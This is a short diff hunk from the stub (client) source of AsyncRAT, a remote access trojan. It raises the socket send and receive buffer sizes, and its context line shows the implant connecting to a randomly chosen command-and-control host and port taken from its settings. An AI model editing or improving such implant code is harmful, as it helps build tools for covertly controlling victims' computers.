@@ -95,8 +95,8 @@ Namespace AsyncRAT_Stub
                 Buffer = New Byte(0) {}
                 MS = New MemoryStream
 
-                S.ReceiveBufferSize = 8192
-                S.SendBufferSize = 8192
+                S.ReceiveBufferSize = 50 * 1000 '8192
+                S.SendBufferSize = 50 * 1000 '8192
 
                 S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
 
